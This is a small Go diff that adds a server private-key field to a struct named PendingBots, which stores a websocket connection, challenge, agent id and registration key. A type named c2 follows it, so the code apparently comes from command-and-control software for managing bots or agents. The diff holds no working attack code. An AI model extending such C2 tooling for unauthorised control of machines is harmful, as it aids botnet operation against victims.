@@ -12,11 +12,12 @@ import (
 )
 
 type PendingBots struct {
-	Conn       *websocket.Conn
-	Challenge  string
-	Agentid    string
-	RegsterKey string
-	PublicKey  []byte
+	Conn             *websocket.Conn
+	Challenge        string
+	Agentid          string
+	RegsterKey       string
+	PublicKey        []byte
+	PrivatekeyServer []byte
 }
 
 type c2 struct {
